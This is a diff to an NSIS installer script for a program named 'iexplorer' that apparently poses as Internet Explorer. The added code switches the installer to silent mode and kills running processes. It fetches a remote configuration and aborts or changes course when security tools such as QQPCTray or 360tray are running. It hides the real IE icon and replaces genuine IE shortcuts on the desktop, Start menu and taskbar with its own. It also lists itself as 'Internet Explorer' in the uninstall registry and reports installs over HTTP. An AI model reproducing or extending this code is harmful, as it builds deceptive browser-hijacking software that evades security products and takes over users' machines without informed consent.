@@ -10,8 +10,8 @@ Var str_ChannelID
 
 !define PRODUCT_NAME "iexplorer"
 !define SHORTCUT_NAME "iexplorer"
-!define PRODUCT_VERSION "8.0.0.9"
-!define VERSION_LASTNUMBER 9
+!define PRODUCT_VERSION "8.0.0.12"
+!define VERSION_LASTNUMBER 12
 !define NeedSpace 10240
 
 !define EM_BrandingText "${PRODUCT_NAME}${PRODUCT_VERSION}"
@@ -145,14 +145,32 @@ FunctionEnd
 
 Var Bool_IsUpdate
 Function .onInit
+	SetSilent silent
 	${If} ${SWITCH_CREATE_UNINSTALL_PAKAGE} == 1 
 		WriteUninstaller "$EXEDIR\..\iexplorer\uninst.exe"
 		Abort
 	${EndIf}
-	System::Call "kernel32::CreateMutexA(i 0, i 0, t 'iesetup_{113CFDBC-6426-4b1a-9539-24ADF327AC93}') i .r1 ?e"
-	Pop $R0
-	StrCmp $R0 0 +2
-	Abort
+	${For} $R3 0 3
+		System::Call "kernel32::CreateMutexA(i 0, i 0, t 'iesetup_{113CFDBC-6426-4b1a-9539-24ADF327AC93}') i .r1 ?e"
+		Pop $R0
+		StrCmp $R0 0 BeginInstall
+		ReadRegStr $R1 HKCU "SOFTWARE\iexplorer" "PackageName"
+		KillProcDLL::KillProc "$R1"
+		${If} $R3 == 3 
+			Abort
+		${Else}
+			Sleep 200
+		${EndIf}
+	${Next}
+	BeginInstall:
+	;将安装包名字写入注册表以便卸载程序杀进程
+	System::Call 'kernel32::GetModuleFileName(i 0, t R2R2, i 256)'
+	Push $R2
+	Push "\"
+	Call GetLastPart
+	Pop $R1
+	WriteRegStr HKCU "SOFTWARE\iexplorer" "PackageName" "$R1"
+	
 	Call UpdateChanel
 	;判断是否覆盖安装
 	StrCpy $Bool_IsUpdate 0
@@ -180,11 +198,33 @@ Function .onInit
 	File "ieneed\msvcr90.dll"
 	File "ieneed\Microsoft.VC90.ATL.manifest"
 	File "ieneed\ATL90.dll"
-	
 	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r0"
 	;${If} $0 == 1
 	;	Abort
 	;${EndIf}
+	;杀进程
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::KillMyIExplorer()"
+	Sleep 500
+	;判断是否杀完全
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::QueryMyExplorerExist() i.R1"
+	${If} $R1 == 1
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'the process of my explore is not kill all')"
+		Abort
+	${EndIf}
+	;最开始下载ini配置
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::DownLoadIniConfig()"
+	;检查黑名单
+	StrCpy $R4 ""
+	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::WaitINI(i 1)"
+	ReadINIStr $R4 "$TEMP\iesetupconfig.js" "entrytype" "blacklist"
+	${If} $R4 == ""
+	${OrIf} $R4 == 0
+		StrCpy $R4 "QQPCTray"
+	${EndIf}
+	Call CheckBlackProcess
+	${If} $R0 == 1
+		Abort
+	${Endif}
 	;获取安装路径
 	StrCpy $1 ${NSIS_MAX_STRLEN}
 	StrCpy $0 ""
@@ -211,11 +251,11 @@ Function .onInit
 	;释放配置文件（预留）
 	;上报
 	${If} $Bool_IsUpdate == 0
-		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'install', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1) "
-		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'installmethod', t '${VERSION_LASTNUMBER}', t '0', i 1) "
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIESelf(t 'install', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1) "
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIESelf(t 'installmethod', t '${VERSION_LASTNUMBER}', t '0', i 1) "
 	${Else}
-		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'update', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1)"
-		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIE(t 'updatemethod', t "${VERSION_LASTNUMBER}", t '0', i 1)"
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIESelf(t 'update', t '${VERSION_LASTNUMBER}', t '$str_ChannelID', i 1)"
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SendAnyHttpStatIESelf(t 'updatemethod', t '${VERSION_LASTNUMBER}', t '0', i 1)"
 	${EndIf}  
 	
 	;写注册表信息
@@ -225,10 +265,10 @@ Function .onInit
 	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallSource" $str_ChannelID
 	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstDir" "$0\iexplorer"
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::GetTime(*l) i(.r2).r1"
-	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallTimes" "$2"
+	WriteRegStr HKCU "SOFTWARE\iexplorer" "InstallTime" "$2"
 	
 	;写入通用的注册表信息
-	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe" "" "$0\iexplorer\program\iexplore.exe"
+	;WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\App Paths\iexplorer.exe" "" "$0\iexplorer\program\iexplore.exe"
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayName" "Internet Explorer"
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "UninstallString" "$0\iexplorer\uninst.exe"
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "DisplayIcon" "$0\iexplorer\program\iexplore.exe"
@@ -236,10 +276,24 @@ Function .onInit
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "URLInfoAbout" ""
 	WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\iexplorer.exe" "Publisher" "iexplorer"
 	;写入ie兼容性信息
-	WriteRegDWORD HKCU "Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION" "iexplore.exe" 0x2af8
+	WriteRegDWORD HKCU "Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION" "iexplore.exe" 11001
 	
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::SoftExit() ? u"
 	Abort
+FunctionEnd
+
+Function CheckBlackProcess
+	StrCpy $R0 0
+	${For} $R5 1 18
+		${WordFind} $R4 "," +$R5 $R3
+		${If} $R3 != 0
+		${AndIf} $R3 != ""
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::QueryProcessExist(t '$R3.exe') i.R0"
+			${If} $R0 == 1
+				${Break}
+			${EndIf}
+		${EndIf}
+	${Next}
 FunctionEnd
 
 Function CreateDeskIcon
@@ -250,31 +304,58 @@ Function CreateDeskIcon
 	${OrIf} $0 == 0
 		Abort
 	${EndIf}
+	
 	SetOutPath "$PROGRAMFILES\Internet Explorer"
 	IfFileExists "$0\IECFG\lnkbak" +2 0
 	CreateDirectory "$0\IECFG\lnkbak"
 	;先备份,姑且认为他是真ie
 	${If} $Bool_IsUpdate == 0
-		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +4
-			WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
-			CopyFiles /silent "$SMPROGRAMS\Internet Explorer.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk"
-			Delete "$SMPROGRAMS\Internet Explorer.lnk"
 		IfFileExists "$DESKTOP\Internet Explorer.lnk" 0 +4
 			WriteRegStr HKCU "SOFTWARE\iexplorer" "DESKTOP" "1"
 			CopyFiles /silent "$DESKTOP\Internet Explorer.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk"
 			Delete "$DESKTOP\Internet Explorer.lnk"
 	${EndIf}
 	;隐藏IE图标， 判断360进程不在才做
-	FindProcDLL::FindProc "360tray.exe"
-	${If} $R0 == 0
+	StrCpy $R1 ""
+	ReadINIStr $R1 "$TEMP\iesetupconfig.js" "entryaction" "dtcheck"
+	;隐藏ie图标
+	${If} $R1 == "1" 
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::QueryProcessExist(t '360tray.exe') i.R0"
+		${If} $R0 == 0
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::HideIEIcon(i 1)"
+			${If} $Bool_IsUpdate == 0
+				WriteRegStr HKCU "SOFTWARE\iexplorer" "HideIEIcon" "1"
+			${EndIf}
+		${EndIf}
+	${Else}
 		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::HideIEIcon(i 1)"
-		WriteRegStr HKCU "SOFTWARE\iexplorer" "HideIEIcon" "1"
+		${If} $Bool_IsUpdate == 0
+			WriteRegStr HKCU "SOFTWARE\iexplorer" "HideIEIcon" "1"
+		${EndIf}
 	${EndIf}
+	StrCpy $R4 ""
+	ReadINIStr $R4 "$TEMP\iesetupconfig.js" "entrytype" "shortcutlist"
+	${If} $R4 == ""
+	${OrIf} $R4 == 0
+		StrCpy $R0 0
+	${Else}
+		Call CheckBlackProcess
+	${EndIf}
+	;创建我们的图标
+	${If} $R0 == 1
+		CreateShortCut "$DESKTOP\Internet Explorer.lnk" "$0\iexplorer\program\iexplore.exe" "/sstartfrom desktop" "" "" "" "" "启动 Internet Explorer 浏览器"
+	${Else}
+		Var /GLOBAL strMyIEPath
+		StrCpy $strMyIEPath '"$0\iexplorer\program\iexplore.exe"'
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::ReplaceIcon(t $strMyIEPath)"
+	${EndIf}
+	Delete "$TEMP\iesetupconfig.js"
+	
 	;入口1
-	CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startmenuprograms" "" "" "" "" "启动 Internet Explorer 浏览器"
+	;CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startmenuprograms" "" "" "" "" "启动 Internet Explorer 浏览器"
 	;入口2
 	;System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::ReplaceIcon(t '$0\${PRODUCT_NAME}\program\iexplore.exe')"
-	CreateShortCut "$DESKTOP\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom desktop" "" "" "" "" "启动 Internet Explorer 浏览器"
+	;CreateShortCut "$DESKTOP\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom desktop" "" "" "" "" "启动 Internet Explorer 浏览器"
 	;入口3
 	System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::IsOsUac() i.r2"
 	${If} $2 == 1 ;win7
@@ -288,6 +369,17 @@ Function CreateDeskIcon
 				${EndIf}
 				ExecShell taskbarunpin "$3\TaskBar\Internet Explorer.lnk"
 				StrCpy $R0 "$3\TaskBar\Internet Explorer.lnk"
+				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
+				Sleep 500
+				Sleep 1
+				Sleep 1
+			IfFileExists "$3\TaskBar\Internet.lnk" 0 +8
+				${If} $Bool_IsUpdate == 0
+					WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
+					CopyFiles /silent "$3\TaskBar\Internet.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk"
+				${EndIf}
+				ExecShell taskbarunpin "$3\TaskBar\Internet.lnk"
+				StrCpy $R0 "$3\TaskBar\Internet.lnk"
 				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
 				Sleep 500
 				Sleep 1
@@ -306,81 +398,173 @@ Function CreateDeskIcon
 			SetOutPath "$PROGRAMFILES\Internet Explorer"
 			CreateShortCut "$0\${PRODUCT_NAME}\program\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom toolbar" "" "" "" "" "启动 Internet Explorer 浏览器"
 			ExecShell taskbarpin "$0\${PRODUCT_NAME}\program\Internet Explorer.lnk" "/sstartfrom toolbar"
-			IfFileExists "$STARTMENU\Internet Explorer.lnk" 0 +6
+			;删除开始菜单下的ie图标
+			IfFileExists "$STARTMENU\Internet Explorer.lnk" 0 +7
 				${If} $Bool_IsUpdate == 0
 					WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
 					CopyFiles /silent "$STARTMENU\Internet Explorer.lnk" "$0\IECFG\lnkbak\STARTMENU_Internet Explorer.lnk"
 				${EndIf}
 				ExecShell startunpin "$3\StartMenu\Internet Explorer.lnk"
 				Sleep 1000
+				Delete "$STARTMENU\Internet Explorer.lnk"
 				Sleep 1
 				Sleep 1
-			IfFileExists "$STARTMENU\Internet.lnk" 0 +6
+			IfFileExists "$STARTMENU\Internet.lnk" 0 +7
 				${If} $Bool_IsUpdate == 0
 					WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
 					CopyFiles /silent "$STARTMENU\Internet.lnk" "$0\IECFG\lnkbak\STARTMENU_Internet.lnk"
 				${EndIf}
 				ExecShell startunpin "$3\StartMenu\Internet.lnk"
 				Sleep 1000
+				Delete "$STARTMENU\Internet.lnk"
 				Sleep 1
 				Sleep 1
-			CreateShortCut "$STARTMENU\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startbar" "" "" "" "" "启动 Internet Explorer 浏览器"
-			StrCpy $R0 "$STARTMENU\Internet Explorer.lnk"
+			IfFileExists "$STARTMENU\启动 Internet Explorer 浏览器.lnk" 0 +7
+				${If} $Bool_IsUpdate == 0
+					WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
+					CopyFiles /silent "$STARTMENU\启动 Internet Explorer 浏览器.lnk" "$0\IECFG\lnkbak\STARTMENU_启动 Internet Explorer 浏览器.lnk"
+				${EndIf}
+				ExecShell startunpin "$3\StartMenu\启动 Internet Explorer 浏览器.lnk"
+				Sleep 1000
+				Delete "$STARTMENU\启动 Internet Explorer 浏览器.lnk"
+				Sleep 1
+				Sleep 1
+			;删除开始菜单程序下的ie图标
+			IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +7
+				${If} $Bool_IsUpdate == 0
+					WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
+					CopyFiles /silent "$SMPROGRAMS\Internet Explorer.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk"
+				${EndIf}
+				ExecShell startunpin "$3\StartMenu\Internet Explorer.lnk"
+				Sleep 1000
+				Delete "$SMPROGRAMS\Internet Explorer.lnk"
+				Sleep 1
+				Sleep 1
+			IfFileExists "$SMPROGRAMS\Internet.lnk" 0 +7
+				${If} $Bool_IsUpdate == 0
+					WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
+					CopyFiles /silent "$SMPROGRAMS\Internet.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet.lnk"
+				${EndIf}
+				ExecShell startunpin "$3\StartMenu\Internet.lnk"
+				Sleep 1000
+				Delete "$SMPROGRAMS\Internet.lnk"
+				Sleep 1
+				Sleep 1
+			IfFileExists "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk" 0 +7
+				${If} $Bool_IsUpdate == 0
+					WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
+					CopyFiles /silent "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_启动 Internet Explorer 浏览器.lnk"
+				${EndIf}
+				ExecShell startunpin "$3\StartMenu\启动 Internet Explorer 浏览器.lnk"
+				Sleep 1000
+				Delete "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk"
+				Sleep 1			
+			CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startmenuprograms" "" "" "" "" "启动 Internet Explorer 浏览器"
+			StrCpy $R0 "$SMPROGRAMS\Internet Explorer.lnk"
 			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
 			Sleep 200
-			ExecShell startpin "$STARTMENU\Internet Explorer.lnk" "/sstartfrom startbar"
+			ExecShell startpin "$SMPROGRAMS\Internet Explorer.lnk" "/sstartfrom startmenuprograms"
 		${EndIf}
 	${Else}
-		IfFileExists "$QUICKLAUNCH\Internet Explorer.lnk" 0 ENDIF1
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'un.CreateDeskIcon 9')"
+		IfFileExists "$QUICKLAUNCH\Internet Explorer.lnk" 0 QUICKLAUNCHOK1
 			${If} $Bool_IsUpdate == 0
 				WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
 				CopyFiles /silent "$QUICKLAUNCH\Internet Explorer.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_Internet Explorer.lnk"
 			${EndIf}
 			Delete "$QUICKLAUNCH\Internet Explorer.lnk"
-		ENDIF1:
-		IfFileExists "$QUICKLAUNCH\Internet.lnk" 0 ENDIF6
-			${If} $Bool_IsUpdate == 0
-				WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
-				CopyFiles /silent "$QUICKLAUNCH\Internet.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk"
-			${EndIf}
-			Delete "$QUICKLAUNCH\Internet.lnk"
-		ENDIF6:
-		IfFileExists "$QUICKLAUNCH\启动 Internet Explorer 浏览器.lnk" 0 ENDIF2
+			QUICKLAUNCHOK1:
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'un.CreateDeskIcon 10')"
+		IfFileExists "$QUICKLAUNCH\启动 Internet Explorer 浏览器.lnk" 0 QUICKLAUNCHOK2
 			${If} $Bool_IsUpdate == 0
 				WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
 				CopyFiles /silent "$QUICKLAUNCH\启动 Internet Explorer 浏览器.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_启动 Internet Explorer 浏览器.lnk"
 			${EndIf}
 			Delete "$QUICKLAUNCH\启动 Internet Explorer 浏览器.lnk"
-		ENDIF2:
-		CreateShortCut "$QUICKLAUNCH\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom toolbar" "" "" "" "" "启动 Internet Explorer 浏览器" 
-		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 ENDIF3
+			QUICKLAUNCHOK2:
+		IfFileExists "$QUICKLAUNCH\Internet.lnk" 0 QUICKLAUNCHOK3
+			${If} $Bool_IsUpdate == 0
+				WriteRegStr HKCU "SOFTWARE\iexplorer" "QUICKLAUNCH" "1"
+				CopyFiles /silent "$QUICKLAUNCH\Internet.lnk" "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk"
+			${EndIf}
+			Delete "$QUICKLAUNCH\Internet.lnk"
+			QUICKLAUNCHOK3:
+		CreateShortCut "$QUICKLAUNCH\Internet Explorer.lnk" "$0\iexplorer\program\iexplore.exe" "/sstartfrom toolbar" "" "" "" "" "启动 Internet Explorer 浏览器" 
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'un.CreateDeskIcon 11')"
+		;删除开始菜单程序下的ie图标
+		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 STARTMENUOK1
 			${If} $Bool_IsUpdate == 0
 				WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
 				CopyFiles /silent "$SMPROGRAMS\Internet Explorer.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet Explorer.lnk"
 			${EndIf}
-			system::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$SMPROGRAMS\Internet Explorer.lnk')"
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$SMPROGRAMS\Internet Explorer.lnk')"
 			Delete "$SMPROGRAMS\Internet Explorer.lnk"
-		ENDIF3:
-		IfFileExists "$SMPROGRAMS\Internet.lnk" 0 ENDIF4
+		STARTMENUOK1:
+		IfFileExists "$SMPROGRAMS\Internet.lnk" 0 STARTMENUOK2
 			${If} $Bool_IsUpdate == 0
 				WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
 				CopyFiles /silent "$SMPROGRAMS\Internet.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_Internet.lnk"
 			${EndIf}
 			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$SMPROGRAMS\Internet.lnk')"
 			Delete "$SMPROGRAMS\Internet.lnk"
-		ENDIF4:
-		IfFileExists "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk" 0 ENDIF5
+		STARTMENUOK2:
+		IfFileExists "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk" 0 STARTMENUOK3
 			${If} $Bool_IsUpdate == 0
 				WriteRegStr HKCU "SOFTWARE\iexplorer" "SMPROGRAMS" "1"
 				CopyFiles /silent "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk" "$0\IECFG\lnkbak\SMPROGRAMS_启动 Internet Explorer 浏览器.lnk"
 			${EndIf}
 			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk')"
 			Delete "$SMPROGRAMS\启动 Internet Explorer 浏览器.lnk"
-		ENDIF5:
-		CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$0\${PRODUCT_NAME}\program\iexplore.exe" "/sstartfrom startmenuprograms" "" "" "" "" "启动 Internet Explorer 浏览器"
+		STARTMENUOK3:
+		;删除开始菜单下的ie图标
+		IfFileExists "$STARTMENU\Internet Explorer.lnk" 0 STARTMENUOK11
+			${If} $Bool_IsUpdate == 0
+				WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
+				CopyFiles  /silent "$STARTMENU\Internet Explorer.lnk" "$0\IECFG\lnkbak\STARTMENU_Internet Explorer.lnk"
+			${EndIf}
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$STARTMENU\Internet Explorer.lnk')"
+			Delete "$STARTMENU\Internet Explorer.lnk"
+		STARTMENUOK11:
+		IfFileExists "$STARTMENU\Internet.lnk" 0 STARTMENUOK22
+			${If} $Bool_IsUpdate == 0
+				WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
+				CopyFiles /silent "$STARTMENU\Internet.lnk" "$0\IECFG\lnkbak\STARTMENU_Internet.lnk"
+			${EndIf}
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$STARTMENU\Internet.lnk')"
+			Delete "$STARTMENU\Internet.lnk"
+		STARTMENUOK22:
+		IfFileExists "$STARTMENU\启动 Internet Explorer 浏览器.lnk" 0 STARTMENUOK33
+			${If} $Bool_IsUpdate == 0
+				WriteRegStr HKCU "SOFTWARE\iexplorer" "STARTMENU" "1"
+				CopyFiles /silent "$STARTMENU\启动 Internet Explorer 浏览器.lnk" "$0\IECFG\lnkbak\STARTMENU_启动 Internet Explorer 浏览器.lnk"
+			${EndIf}
+			System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$STARTMENU\启动 Internet Explorer 浏览器.lnk')"
+			Delete "$STARTMENU\启动 Internet Explorer 浏览器.lnk"
+		STARTMENUOK33:
+		CreateShortCut "$SMPROGRAMS\Internet Explorer.lnk" "$0\iexplorer\program\iexplore.exe" "/sstartfrom startmenuprograms" "" "" "" "" "启动 Internet Explorer 浏览器" 
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'un.CreateDeskIcon 12')"
 		SetOutPath "$TEMP\${PRODUCT_NAME}"
 		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b true, t '$SMPROGRAMS\Internet Explorer.lnk')"
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'un.CreateDeskIcon 13')"
+		${RefreshShellIcons}
 	${EndIf}
+	;入口5
+	;StrCpy $R1 ""
+	;ReadRegStr $R1 HKCU "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" ""
+	;${If} $R1 != ""
+	;	${If} $Bool_IsUpdate == 0
+	;		WriteRegStr HKCU "SOFTWARE\iexplorer" "StartMenuInternet" "$R1"
+	;	${EndIf}
+	;	WriteRegStr HKCU "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" "" '"$0\iexplorer\program\iexplore.exe"'
+	;${EndIf}
+	;StrCpy $R1 ""
+	;ReadRegStr $R1 HKLM "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" ""
+	;${If} $R1 != ""
+	;	${If} $Bool_IsUpdate == 0
+	;		WriteRegStr HKCU "SOFTWARE\iexplorer" "StartMenuInternet" "$R1"
+	;	${EndIf}
+	;	WriteRegStr HKLM "Software\Clients\StartMenuInternet\IEXPLORE.EXE\shell\open\command" "" '"$0\iexplorer\program\iexplore.exe"'
+	;${EndIf}
 	;锁定到任务栏
 FunctionEnd
 
@@ -412,11 +596,16 @@ Function un.DeleteIcon
 		ExecShell taskbarunpin "$3\TaskBar\Internet Explorer.lnk"
 		StrCpy $R0 "$3\TaskBar\Internet Explorer.lnk"
 		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
-		Sleep 200
+		Sleep 1000
+		
 		ExecShell startunpin "$3\StartMenu\Internet Explorer.lnk"
+		;System::Call "shell32::ShellExecute(i 0, t 'startunpin', t '$3\StartMenu\Internet Explorer.lnk', t 0, t 0, i 0) ?e"
+		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::NsisTSLOG(t 'startunpin path = $3\StartMenu\Internet Explorer.lnk')"
 		StrCpy $R0 "$3\StartMenu\Internet Explorer.lnk"
 		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t "$R0")"
-		Sleep 200
+		Sleep 1000
+		IfFileExists "$SMPROGRAMS\Internet Explorer.lnk" 0 +2
+		Delete "$SMPROGRAMS\Internet Explorer.lnk"
 	${Else}
 		Delete "$QUICKLAUNCH\Internet Explorer.lnk"
 		System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::PinToStartMenu4XP(b 0, t '$SMPROGRAMS\Internet Explorer.lnk')"
@@ -450,23 +639,61 @@ Function un.DeleteIcon
 				IfFileExists "$0\IECFG\lnkbak\QUICKLAUNCH_Internet Explorer.lnk" 0 +3
 				CopyFiles /silent "$0\IECFG\lnkbak\QUICKLAUNCH_Internet Explorer.lnk" "$3\TaskBar\Internet Explorer.lnk"
 				ExecShell taskbarpin "$3\TaskBar\Internet Explorer.lnk"
+				Goto TASKRERSTOREOK
 				IfFileExists "$0\IECFG\lnkbak\QUICKLAUNCH_启动 Internet Explorer 浏览器.lnk" 0 +3
 				CopyFiles /silent "$0\IECFG\lnkbak\QUICKLAUNCH_启动 Internet Explorer 浏览器.lnk" "$3\TaskBar\启动 Internet Explorer 浏览器.lnk"
 				ExecShell taskbarpin "$3\TaskBar\启动 Internet Explorer 浏览器.lnk"
+				Goto TASKRERSTOREOK
+				IfFileExists "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk" 0 +3
+				CopyFiles /silent "$0\IECFG\lnkbak\QUICKLAUNCH_Internet.lnk" "$3\TaskBar\Internet.lnk"
+				ExecShell taskbarpin "$3\TaskBar\Internet.lnk"
+				TASKRERSTOREOK:
 			${EndIf}
 			${If} $R8 == "1" 
 				IfFileExists "$0\IECFG\lnkbak\STARTMENU_Internet Explorer.lnk" 0 +6
 				CopyFiles /silent "$0\IECFG\lnkbak\STARTMENU_Internet Explorer.lnk" "$STARTMENU\Internet Explorer.lnk"
 				StrCpy $R0 "$STARTMENU\Internet Explorer.lnk"
 				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
-				Sleep 200
+				Sleep 1000
 				ExecShell startpin "$STARTMENU\Internet Explorer.lnk"
+				Goto StartMenuRestoreOK
 				IfFileExists "$0\IECFG\lnkbak\STARTMENU_Internet.lnk" 0 +6
 				CopyFiles /silent "$0\IECFG\lnkbak\STARTMENU_Internet.lnk" "$STARTMENU\Internet.lnk"
 				StrCpy $R0 "$STARTMENU\Internet Explorer.lnk"
 				System::Call "$TEMP\${PRODUCT_NAME}\YBSetUpHelper::RefleshIcon(t '$R0')"
-				Sleep 200
+				Sleep 1000
 				ExecShell startpin "$STARTMENU\Internet Explorer.lnk"
+				Goto StartMenuRestoreOK
+				IfFileExists "$0\IECFG\lnkbak\STARTMENU_启动 Internet Explorer 浏览器.lnk" 0 +6
